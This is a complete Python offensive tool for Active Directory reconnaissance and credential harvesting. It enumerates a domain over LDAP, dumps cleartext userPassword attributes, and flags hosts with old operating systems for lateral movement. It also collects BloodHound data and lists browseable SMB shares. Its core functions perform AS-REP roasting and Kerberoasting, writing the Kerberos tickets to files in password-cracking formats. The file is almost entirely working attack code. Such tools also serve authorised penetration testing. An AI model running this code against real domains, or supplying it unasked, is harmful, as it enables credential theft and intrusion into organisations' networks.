#!/usr/bin/python3
from ldap3 import Server, Connection, ALL, ALL_ATTRIBUTES, LEVEL, SUBTREE, ALL_OPERATIONAL_ATTRIBUTES
from progressbar import Bar, Percentage, ProgressBar, ETA
from ldap3.core.exceptions import LDAPKeyError
from impacket.smbconnection import SessionError
from impacket.nmb import NetBIOSTimeout, NetBIOSError
from getpass import getpass
from termcolor import colored
from impacket import smbconnection
from impacket.dcerpc.v5 import srvs
import contextlib
import argparse, textwrap, errno, sys, socket, json, re, os

# Thanks SecureAuthCorp for GetNPUsers.py
# For Kerberos preauthentication
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify
import datetime, random

# Thanks SecureAuthCorp for GetUserSPNs.py
# For SPN enum
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.krb5.asn1 import TGS_REP

from external.bloodhound import BloodHound, resolve_collection_methods
from external.bloodhound.ad.domain import *
from external.bloodhound.ad.authentication import ADAuthentication


class EnumAD():

    def __init__(self, domainController, ldaps, output, enumsmb, bhout, kpre, spnEnum, domuser=None, getAll=True, computer=None):
        self.server = domainController
        self.domuser = domuser
        self.ldaps = ldaps
        if not getAll:
            self.computer = computer
        if domuser is not None:
            self.passwd = str(getpass())

        self.ou_structure = domainController.split('.')
        self.dc_string=''
        for element in self.ou_structure:
            self.dc_string += 'dc={},'.format(element)
        
        # LDAP properties
        # At the moment we just want everything
        self.ldapProps = ["*"]


        # Setting lists containing elements we want from the domain controller
        self.computers = []
        self.people = []
        self.groups = []
        self.spn = []
        self.acl = []
        self.gpo = []
        self.domains = []
        self.ous = []

        
        self.bind()
        self.search()
        
        self.checkForPW()
        self.checkOS()

        if bhout:
            self.outputToBloodhoundJson()
    
        if kpre:
            self.enumKerbPre()
    
        if spnEnum:
            self.enumSPNUsers()
        
        self.conn.unbind()

        if output:
            self.output = output
            self.write_file()
        
        if enumsmb:
            # Setting variables for further testing and analysis
            self.smbShareCandidates = []
            self.smbBrowseable = {}
            self.sortComputers()
            self.enumSMB()

        # Lets clear variable now
        self.passwd = None

    
    @contextlib.contextmanager
    def suppressOutput(self):
        with open(os.devnull, 'w') as devnull:
            with contextlib.redirect_stderr(devnull) as err, contextlib.redirect_stdout(devnull) as out:
                yield (err, out)


    def bind(self): 
        try:
            if self.ldaps:
                self.dc_conn = Server(self.server, port=636, use_ssl=True, get_info='ALL')
                self.conn = Connection(self.dc_conn, user=self.domuser, password=self.passwd)
                self.conn.bind()
                self.conn.start_tls()
                # Validate the login (bind) request
                if int(self.conn.result['result']) != 0:
                    print('\033[1A\r[ ' + colored('NOT OK', 'red') +' ] Failed to bind to LDAPS server: {0}'.format(self.conn.result['description']))
                    sys.exit(1)
                else:
                    print('\033[1A\r[ ' + colored('OK', 'green') +' ] Bound to LDAPS server: {0}'.format(self.server))           
            else:
                self.dc_conn = Server(self.server, get_info=ALL)
                self.conn = Connection(self.dc_conn, user=self.domuser, password=self.passwd)
                self.conn.bind()
                # Validate the login (bind) request
                if int(self.conn.result['result']) != 0:
                    print('\033[1A\r[ ' + colored('NOT OK', 'red') +' ] Failed to bind to LDAP server: {0}'.format(self.conn.result['description']))
                    sys.exit(1)
                else:
                    print('\033[1A\r[ ' + colored('OK', 'green') +' ] Bound to LDAP server: {0}'.format(self.server))
        # TODO: Catch individual exceptions instead
        except Exception as e:
            if self.ldaps:
                print('\033[1A\r[ ' + colored('NOT OK', 'red') +' ] Failed to bind to LDAPS server: {0}'.format(self.server))
            else:
                print('\033[1A\r[ ' + colored('NOT OK', 'red') +' ] Failed to bind to LDAP server: {0}'.format(self.server))
            sys.exit(1)


    def search(self):
       

        # Get computer objects
        self.conn.search(self.dc_string[:-1], '(&(sAMAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.computers.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Computer objects')

        # Get person objects
        self.conn.search(self.dc_string[:-1], '(objectCategory=person)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.people.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Person objects')
        
        # Get group objects
        self.conn.search(self.dc_string[:-1], '(|(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913)(primarygroupid=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.groups.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Group objects')

        # Get SPN objects
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(serviceprincipalname=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.spn.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all SPN objects')

        # Get ACL objects
        self.conn.search(self.dc_string[:-1], '(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)(samAccountType=268435457)(samAccountType=536870912)(samAccountType=536870913)(objectClass=domain)(&(objectcategory=groupPolicyContainer)(flags=*))(objectcategory=organizationalUnit))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.acl.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all ACL objects')

        # Get GPO objects
        self.conn.search(self.dc_string[:-1], '(|(&(&(objectcategory=groupPolicyContainer)(flags=*))(name=*)(gpcfilesyspath=*))(objectcategory=organizationalUnit)(objectClass=domain))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.gpo.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all GPO objects')

        # Get Domain
        self.conn.search(self.dc_string[:-1], '(objectclass=domain)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.domains.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Domains')

        # Get OUs
        self.conn.search(self.dc_string[:-1], '(objectclass=organizationalUnit)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.ous.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all OUs')


    '''
        Since it sometimes is real that the property 'userPassword:' is set
        we test for it and dump the passwords
    '''
    def checkForPW(self):
        passwords = {}
        idx = 0
        for entry in self.people:
            user = json.loads(self.people[idx].entry_to_json())
            idx += 1    
            if user['attributes'].get('userPassword') is not None:
                passwords[user['attributes']['name']] = user['attributes']['userPassword']
        if len(passwords.keys()) > 0:
            with open('{0}-clearpw'.format(self.server), 'w') as f:
                json.dump(passwords, f, sort_keys=False) 

        if len(passwords.keys()) == 1:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} clear text password'.format(len(passwords.keys())))
        elif len(passwords.keys()) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} clear text password'.format(len(passwords.keys())))
        else:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} clear text passwords'.format(len(passwords.keys())))


    '''
        While it is not unusual to find EOL servers hidden or forgotten these 
        often makes easier targets for lateral movemen, and because of that 
        we'll dump the lowest registered OS and the respective hosts for easier 
        enumeration afterwards
    '''
    def checkOS(self):

        os_json = {
                # Should perhaps include older version
                "Windows XP": [],
                "Windows Server 2008": [],
                "Windows 7": [],
                "Windows Server 2012": [],
                "Windows 10": [],
                "Windows Server 2016": [],
                "Windows Server 2019": []
        }
        idx = 0
        for entry in self.computers:
            computer = json.loads(self.computers[idx].entry_to_json())
            idx += 1    

            for os_version in os_json.keys():
                try:
                    if os_version in computer['attributes'].get('operatingSystem'):
                        os_json[os_version].append(computer['attributes']['dNSHostName'])
                except TypeError:
                    # computer['attributes'].get('operatingSystem') is of NoneType, just continue
                    continue

        for key, value in os_json.items():
            if len(value) == 0:
                continue
            with open('{0}-oldest-OS'.format(self.server), 'w') as f:
                for item in value:
                    f.write('{0}: {1}\n'.format(key, item))
                break

        print('[ ' + colored('OK', 'green') +' ] Wrote hosts with oldest OS to {0}-oldest-OS'.format(self.server))


    def splitJsonArr(self, arr):
        if isinstance(arr, list):
            if len(arr) == 1:
                return arr[0]
        return arr


    def outputToBloodhoundJson(self):
        print('[ ' + colored('OK', 'green') +' ] Generating BloodHound output - this may take time...')
        try:
            with self.suppressOutput():
                opts = argparse.Namespace(dns_tcp=False, global_catalog=self.server)
                auth = ADAuthentication(username=self.domuser, password=self.passwd, domain=self.server)
                ad = AD(auth=auth, domain=self.server, nameserver=None, dns_tcp=False)
                ad.dns_resolve(kerberos=False, domain=self.server, options=opts)
                bloodhound = BloodHound(ad)
                bloodhound.connect()
                collection = resolve_collection_methods('Session,Trusts,ACL,DCOM,RDP,PSRemote')
                bloodhound.run(collect=collection, num_workers=40, disable_pooling=False)
                print('[ ' + colored('OK', 'green') +' ] BloodHound output generated')
        except Exception as e:
            print('[ ' + colored('NOT OK', 'red') +' ] Generating BloodHound output failed')


    def sortComputers(self):
        for computer in self.computers:
            try:
                self.smbShareCandidates.append(computer['dNSHostName'])
            except LDAPKeyError:
                # No dnsname registered
                continue
        if len(self.smbShareCandidates) == 1:
            print('[ ' + colored('OK', 'green') +' ] Found {0} dnsname'.format(len(self.smbShareCandidates)))
        else:
            print('[ ' + colored('OK', 'green') +' ] Found {0} dnsnames'.format(len(self.smbShareCandidates)))


    def enumSMB(self):
        progBar = ProgressBar(widgets=['SMBConnection test: ', Percentage(), Bar(), ETA()], maxval=len(self.smbShareCandidates)).start()
        prog = 0
        try:
            for dnsname in self.smbShareCandidates:
                try:
                    # Changing default timeout as shares should respond withing 5 seconds if there is a share
                    # and ACLs make it available to self.user with self.passwd
                    smbconn = smbconnection.SMBConnection('\\\\' + str(dnsname), str(dnsname), timeout=5)
                    smbconn.login(self.domuser, self.passwd)
                    dirs = smbconn.listShares()
                    self.smbBrowseable[str(dnsname)] = {}
                    for share in dirs:
                        self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
                        try:
                            path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                            self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                            # Didnt have permission, all good
                            # Im second guessing the below adding to the JSON file as we're only interested in the listable directories really
                            #self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = False
                            continue
                    smbconn.logoff()
                    progBar.update(prog + 1)
                    prog += 1
                except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError) as err:
                    # TODO: Examine why we sometimes get:
                    # impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE
                    # on healthy shares. It seems to be reported with CIF shares 
                    progBar.update(prog + 1)
                    prog += 1
                    continue
        except ValueError as e:
            # We reached end of progressbar, continue since we finish below
            pass
        progBar.finish()
        print('')

        availDirs = []
        for key, value in self.smbBrowseable.items():
            for k, v in value.items():
                if v:
                    availDirs.append(key)

        if len(self.smbShareCandidates) == 1:
            print('[ ' + colored('OK', 'green') + ' ] Searched {0} share and {1} with {2} subdirectories/files is browseable by {3}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.domuser))
        else:
            print('[ ' + colored('OK', 'green') + ' ] Searched {0} shares and {1} with {2} subdirectories/file sare browseable by {3}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.domuser))
        if len(self.smbBrowseable.keys()) > 0:
            with open('{0}-open-smb.json'.format(self.server), 'w') as f:
                json.dump(self.smbBrowseable, f)
            print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb'.format(self.server))



    def write_file(self):
        with open(str(self.output) + '-computers', 'w') as f:
            for item in self.computers:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-people', 'w') as f:
            for item in self.people:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-groups', 'w') as f:
            for item in self.groups:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-spn', 'w') as f:
            for item in self.spn:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-acl', 'w') as f:
            for item in self.acl:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-gpo', 'w') as f:
            for item in self.gpo:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-domains', 'w') as f:
            for item in self.domains:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-ous', 'w') as f:
            for item in self.ous:
                f.write(str(item))
                f.write("\n")

        print('[ ' + colored('OK', 'green') +' ] Wrote all files to {0}-obj_name'.format(self.output))


    def enumKerbPre(self):
        # Build user array
        users = []
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.server))
        if len(users) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
        elif len(users) == 1:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
        else:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
    
        hashes = []
        # Build request for Tickets
        for usr in users:
            clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            asReq = AS_REQ()
            domain = str(self.server).upper()
            serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            pacReq = KERB_PA_PAC_REQUEST()
            pacReq['include-pac'] = True
            encodedPacReq = encoder.encode(pacReq)
            asReq['pvno'] = 5
            asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
            asReq['padata'] = noValue
            asReq['padata'][0] = noValue
            asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
            asReq['padata'][0]['padata-value'] = encodedPacReq

            requestBody = seq_set(asReq, 'req-body')

            options = list()
            options.append(constants.KDCOptions.forwardable.value)
            options.append(constants.KDCOptions.renewable.value)
            options.append(constants.KDCOptions.proxiable.value)
            requestBody['kdc-options'] = constants.encodeFlags(options)

            seq_set(requestBody, 'sname', serverName.components_to_asn1)
            seq_set(requestBody, 'cname', clientName.components_to_asn1)

            requestBody['realm'] = domain

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
            requestBody['till'] = KerberosTime.to_asn1(now)
            requestBody['rtime'] = KerberosTime.to_asn1(now)
            requestBody['nonce'] = random.getrandbits(31)

            supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

            seq_set_iter(requestBody, 'etype', supportedCiphers)

            msg = encoder.encode(asReq)

            try:
                response = sendReceive(msg, domain, self.server)
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                    seq_set_iter(requestBody, 'etype', supportedCiphers)
                    msg = encoder.encode(asReq)
                    response = sendReceive(msg, domain, self.server)
                else:
                    print(e)
                    continue

            asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

            hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

        if len(hashes) > 0:
            with open('{0}-jtr-hashes'.format(self.server), 'w') as f:
                for h in hashes:
                    f.write(str(h) + '\n')

            print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.server))
        else:
            print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')


    def enumSPNUsers(self):
        users_spn = {
        }
        user_tickets = {
        }

        userDomain = self.domuser.split('@')[1]

        idx = 0
        for entry in self.spn:
            spn = json.loads(self.spn[idx].entry_to_json())
            users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
            idx += 1    

        # Get TGT for the supplied user
        client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            # We need to take the domain from the user@domain since it *could* be a cross-domain user
            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=None)

            TGT = {}
            TGT['KDC_REP'] = tgt
            TGT['cipher'] = cipher
            TGT['sessionKey'] = newSession
    
            for user, spns in users_spn.items():
                if isinstance(spns, list):
                    # We only really need one to get a ticket
                    spn = spns[0]
                else:
                    spn = spns
                    try:
                        # Get the TGS
                        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                        tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
                        # Decode the TGS
                        decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                        # Get different encryption types
                        if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                            user_tickets[spn] = entry
                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
                            user_tickets[spn] = entry
                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
                            user_tickets[spn] = entry
                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                            user_tickets[spn] = entry

                    except KerberosError:
                        # For now continue
                        # TODO: Maybe look deeper into issue here
                        continue

            if len(user_tickets.keys()) > 0:
                with open('{0}-spn-tickets'.format(self.server), 'w') as f:
                    for key, value in user_tickets.items():
                        f.write('{0}:{1}\n'.format(key, value))
                if len(user_tickets.keys()) == 1:
                    print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting'.format(len(user_tickets.keys())))
                else:
                    print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
            else:
                print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))


        except KerberosError as err:
            print('[ ' + colored('NOT OK', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='activeDirectoryEnum', formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''\
            ___        __  _            ____  _                __                   ______                    
           /   | _____/ /_(_)   _____  / __ \(_)_______  _____/ /_____  _______  __/ ____/___  __  ______ ___ 
          / /| |/ ___/ __/ / | / / _ \/ / / / / ___/ _ \/ ___/ __/ __ \/ ___/ / / / __/ / __ \/ / / / __ `__ \\
         / ___ / /__/ /_/ /| |/ /  __/ /_/ / / /  /  __/ /__/ /_/ /_/ / /  / /_/ / /___/ / / / /_/ / / / / / /
        /_/  |_\___/\__/_/ |___/\___/_____/_/_/   \___/\___/\__/\____/_/   \__, /_____/_/ /_/\__,_/_/ /_/ /_/ 
                                                                          /____/                             

    |*----------------------------------------------------------------------------------------------------------*|

            '''))
    parser.add_argument('dc', type=str, help='Hostname of the Domain Controller')
    parser.add_argument('-o', '--out-file', type=str, help='Path to output file. If no path, CWD is assumed (default: None)')
    parser.add_argument('user', type=str, help='Username of the domain user to query with. The username has to be domain name as `user@domain.org`')
    parser.add_argument('-s', '--secure', help='Try to estalish connection through LDAPS', action='store_true')
    parser.add_argument('-smb', '--smb', help='Force enumeration of SMB shares on all computer objects fetched', action='store_true')
    parser.add_argument('-kp', '--kerberos_preauth', help='Attempt to gather users that does not require Kerberos preauthentication', action='store_true')
    parser.add_argument('-bh', '--bloodhound', help='Output data in the format expected by BloodHound', action='store_true')
    parser.add_argument('-spn', help='Attempt to get all SPNs and perform Kerberoasting', action='store_true')
    parser.add_argument('--all', help='Run all checks', action='store_true')

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    if args.all:
        args.smb = True
        args.kerberos_preauth = True
        args.bloodhound = True
        args.spn = True
    
    # Boolean flow control flags
    file_to_write = None
    if args.out_file:
        file_to_write = args.out_file

    enumAD = EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.user)

    # Just print a blank line for output sake
    print('')
